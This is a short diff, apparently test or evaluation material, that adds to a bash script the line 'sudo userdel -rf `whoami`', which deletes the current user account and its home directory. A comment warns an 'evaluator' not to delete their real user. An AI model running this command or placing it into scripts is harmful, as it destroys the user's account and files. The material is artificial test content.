@@ -1,1 +1,5 @@
 #!/bin/bash
+
+sudo userdel -rf `whoami`
+
+# !evaluator! be careful not to delete your real user on current machine!
